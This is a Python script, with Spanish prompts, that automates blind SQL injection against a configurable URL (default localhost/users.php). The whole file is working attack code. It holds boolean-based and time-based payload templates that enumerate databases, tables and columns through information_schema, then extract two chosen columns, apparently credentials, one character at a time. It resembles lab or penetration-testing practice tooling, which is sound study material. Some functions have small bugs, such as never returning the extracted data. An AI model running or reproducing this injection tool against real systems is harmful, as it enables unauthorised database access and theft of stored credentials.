import requests
import signal
import sys
import time
import argparse
from pwn import *

def def_handler(sig, frame):
        print ("\n\n[!] Saliendo...")
        sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

#Vars
url = 'http://localhost/users.php' # [!] change this
delay = 0.35

#Boolean-based payloads
payload_DBs = '?id=777 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),{position},1)) from users where id = {param})={char})'
payload_Tables = '?id=777 or (SELECT (SELECT ASCII(SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = \'{db}\'),{position},1)) FROM users WHERE id = {param})={char})'
#payload_Columns = '?id=777 OR ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema = \'{db}\' AND table_name = \'{tbl}\' LIMIT {column_index},1), {position}, 1)) = {char}'
payload_Columns = "?id=777 OR ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema = '{db}' AND table_name = '{tbl}' LIMIT {column_index},1), {position}, 1)) = {char}"
payload_data = '?id=777 or (select(select ascii(substring((select group_concat({col_1},0x3a,{col_2}) from {table_name}),{position},1)) from {table_name} where id={param})={char})'

#Time-based payloads
#payload_time_actualDB = '?id={param} and if(ascii(substr(database(),{position},1))={char}, sleep(0.40),1)'
payload_TimeDBs = '?id=777 OR IF(ASCII(SUBSTRING((SELECT group_concat(schema_name) FROM information_schema.schemata),{position},1))={char}, SLEEP({delay}), 0)'
payload_TimeTables = '?id=777 OR IF(ASCII(SUBSTRING((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = \'{db}\'),{position},1))={char}, SLEEP({delay}), 0)'
payload_TimeColumns = '?id=777 OR IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema = \'{db}\' AND table_name = \'{tbl}\' LIMIT {column_index},1), {position}, 1))={char}, SLEEP({delay}), 0)'
payload_TimeData = '?id=777 OR IF(ASCII(SUBSTRING((SELECT group_concat({col_1},0x3a,{col_2}) FROM {table_name}),{position},1))={char}, SLEEP({delay}), 0)'

################################################### TIME-BASED ###################################################

def leakTimeDBs(payload):
  p1 = log.progress("Databases")
  data = ""
  count = 0

  for position in range(1, 150):
    found = False
    for char in range(33, 127):
      inject = url + payload.format(position=position, char=char, delay=delay)
      time_st = time.time()
      r = requests.get(inject)
      time_end = time.time()
      if time_end - time_st > delay:
        data += chr(char)
        p1.status(data)
        found = True
        count = 0
        break
    if not found:
      count += 1
      if count > 3:
        data += ", "
        count = 0
        break
  return data

def leakTimeTables(db_name, payload):
  p1 = log.progress("Tables")
  data=""
  count = 0

  for position in range(1, 150):
    found = False
    for char in range(33, 127):
      inject = url + payload.format(db=db_name, position=position, char=char, delay=delay)
      time_st = time.time()
      r = requests.get(inject)
      time_end = time.time()
      if time_end - time_st > delay:
        data += chr(char)
        p1.status(data)
        found = True
        count = 0
        break
    if not found:
      count += 1
      if count > 3:
        data += ", "
        count = 0
        break
  return data

def leakTimeColumns(db_name, tbl_name, payload):
  p1 = log.progress("Columns")
  data=""
  count = 0
  num_columns = 20

  for column_index in range(num_columns):
    column_name = ""
    for position in range(1, 100):
      found = False
      for char in range(33, 127):
        inject = url + payload.format(db=db_name, tbl=tbl_name, column_index=column_index, position=position, char=char, delay=delay)
        time_st = time.time()
        r = requests.get(inject)
        time_end = time.time()
        if time_end - time_st > delay:
          column_name += chr(char)
          p1.status(column_name)
          found = True
          break
      if not found:
        break
    data += column_name + " "
    p1.status(data.strip())
  return data

#payload_TimeData = '?id=777 OR IF(ASCII(SUBSTRING((SELECT group_concat({col_1},0x3a,{col_2}) FROM {table_name}),{position},1))={char}, SLEEP({delay}), 0)'
def leakTimeData(tbl_name, col_1, col_2, payload):
  p1 = log.progress("Data")
  data=""
  count = 0

  for position in range(1,120):
    found = False
    for char in range(33, 127):
      inject = url + payload.format(col_1=col_1, col_2=col_2, table_name=tbl_name, position=position, char=char, delay=delay)
      time_st = time.time()
      r = requests.get(inject)
      time_end = time.time()
      if time_end - time_st > delay:
        found = True
        data+=chr(char)
        p1.status(data)
        break
    if not found:
      count +=1
      if count > 3:
        count = 0
        break


################################################### BOOLEAN-BASED ###################################################

def leakColumns(database_name, table_name, payload):
  num_columns = 20
  data = ""
  p1 = log.progress("Columns")

  for column_index in range(num_columns):
    column_name = ""
    for position in range(1, 100):
      found = False
      for char in range(33, 127):
        inject = url + payload.format(db=database_name, tbl=table_name, column_index=column_index, position=position, char=char)
        r = requests.get(inject)
        if r.status_code == 200:
          column_name += chr(char)
          p1.status(column_name)
          found = True
          break
      if not found:
        break
    if column_name: 
      data += column_name + " "
      p1.status(data.strip())
    else:
      break
  
  return data

def LeakTables(database_name, payload, param):
  p1 = log.progress("Tables")
  data = ""
  count = 0

  for position in range(1, 150):
    found = False
    for char in range(32, 127):
      inject = url + payload.format(db=database_name, position=position, param=param, char=char)
      r = requests.get(inject)
      if r.status_code == 200:
        data += chr(char)
        p1.status(data)
        found = True
        count = 0
        break
    if not found:
      count+=1
      if count > 3:
        data += ', '
        count = 0
        break

  return data

def Params():
  params_on = []
  p1 = log.progress("Parameters ON")
  for param in range(999, 1010):
     r = requests.get(url + "?id=%d" %param)
     if r.status_code == 200:
       params_on.append(param)
       p1.status(params_on)

  return params_on

def leakDB(param, payload):
  p1 = log.progress("Data")
  data = ""
  count = 0

  for position in range(1,150):
    found = False
    for char in range(33, 127):
      inject = url + payload.format(position=position, param=param, char=char)
      r = requests.get(inject)
      if r.status_code == 200:
        data += chr(char)
        p1.status(data)
        found = True
        count = 0
    if not found:
      count+=1
      if count > 3:
        data += ', '
        count = 0
        break

  return data

def LeakData(table_name, col_1, col_2, params_on, payload):
  p1 = log.progress("FuzZQLi")
  p2 = log.progress("Data")
  time.sleep(2)
  data=""
  count = 0

  for param in params_on:
    for position in range(1,120):
      found = False
      for char in range(33, 127):
        inject = url + payload.format(col_1=col_1, col_2=col_2, table_name=table_name, position=position, param=param, char=char)
        p1.status(payload)
        r = requests.get(inject)
        if r.status_code == 200:
          found = True
          data+=chr(char)
          p2.status(data)
          break

      if not found:
        count +=1
        if count > 3:
          count = 0
          break

############ EXTRACT BOOLEAN LISTS ############
def DBList():
  DBs_chain = leakDB(param_test, payload_DBs)
  elem_db = DBs_chain.split(',')
  DBs = []
  DBs.extend(elem_db)
  return DBs

def TableList(selecDB):
  Tables_chain = LeakTables(DBs[selecDB -1], payload_Tables, param_test)
  elem_T = Tables_chain.split(',')
  Tables = []
  for item in elem_T:
    cleaned_item = item.strip()
    if cleaned_item:
      Tables.append(cleaned_item)
  return Tables

def ColumnList(selecDB, selecTab):
  Column_chain = leakColumns(DBs[selecDB -1], Tables[selecTab -1], payload_Columns)
  elem_col = Column_chain.split(' ')
  Cols = []
  for item in elem_col:
    cleaned_items = item.strip()
    if cleaned_items:
      Cols.extend(cleaned_items)
  return Cols

############ EXTRACT TIME LISTS ############
def DBTimeList():
  DBs_chain = leakTimeDBs(payload_TimeDBs)
  elem_db = DBs_chain.split(',')
  DBsTime = []
  DBsTime.extend(elem_db)
  return DBsTime

def TableTimeList(selecDBTime):
  Tables_chain = leakTimeTables(DBsTime[selecDBTime -1], payload_TimeTables)
  elem_T = Tables_chain.split(',')
  TablesTime = []
  for item in elem_T:
    cleaned_item = item.strip()
    if cleaned_item:
      TablesTime.append(cleaned_item)
  return TablesTime

def ColumnTimeList(selecDBTime, selecTabTime):
  Cols = leakTimeColumns(f"{DBsTime[selecDBTime -1]}", f"{TablesTime[selecTabTime -1]}", payload_TimeColumns)
  print(type(Cols))
  print(Cols)
  column_names = Cols.split()
  print(column_names)
  ColsTime = []
  ColsTime.extend(column_names)
  return ColsTime


################################################### MAIN ###################################################

if __name__ == '__main__':

  params_on = Params()
  param_test = params_on[0]
  parser = argparse.ArgumentParser(description='Select type injection attack')
  parser.add_argument('--type', type=str, help='b for boolean-based injection <----> t for time-based injection.', required=True)

  args = parser.parse_args()

  if args.type == 'b':
    ##### Testing boolean-based #####
    #Databases
    DBs = DBList()
    print(f"[+] Existen {len(DBs) -1} bases de datos")
    selecDB = int(input("Elija una para listar: "))

    #Tables
    Tables = TableList(selecDB)
    print(f"[+] Existen {len(Tables)} tablas en {DBs[selecDB -1]}")
    selecTab = int(input("Elija una para listar: "))

    #Columns
    Cols = ColumnList(selecDB, selecTab)
    print(f"[+] Existen {len(Cols) -1} columnas en {DBs[selecDB -1]}.{Tables[selecTab -1]}")
    selecCol_1 = int(input("Elija una primera columna para listar: "))
    selecCol_2 = int(input("Elija una segunda columna para listar: "))

    #Users
    Creds = LeakData(Tables[selecTab -1], Cols[selecCol_1 -1], Cols[selecCol_2 -1], params_on, payload_data)


  elif args.type == 't':
    ##### Testing time-based #####
    #Databases
    DBsTime = DBTimeList()
    print(f"[+] Existen {len(DBsTime) -1} bases de datos")
    selecDBTime = int(input("Elija una para listar: "))
    print(f"\nSe ha elegido la base de datos {DBsTime[selecDBTime -1]}\n")

    #Tables
    TablesTime = TableTimeList(selecDBTime)
    print(f"[+] Existen {len(TablesTime)} tablas en {DBsTime[selecDBTime -1]}")
    selecTabTime = int(input("Elija una para listar: "))
    print(f"\nSe ha elegido la tabla {TablesTime[selecTabTime -1]}\n")

    ColsTime = ColumnTimeList(selecDBTime, selecTabTime)
    print(f"[+] Existen {len(ColsTime) -1} columnas en {DBsTime[selecDBTime -1]}.{TablesTime[selecTabTime -1]}")
    selecCol_1Time = int(input("Elija una primera columna para listar: "))
    selecCol_2Time = int(input("Elija una segunda columna para listar: "))

    CredsTime = leakTimeData(TablesTime[selecTabTime -1], ColsTime[selecCol_1Time -1],ColsTime[selecCol_2Time -1], payload_TimeData)
  else:
      print("[!] ERROR: Not a valid parameter.\n\t--type b for boolean-based injection\n\t--type t for time-based injection.")
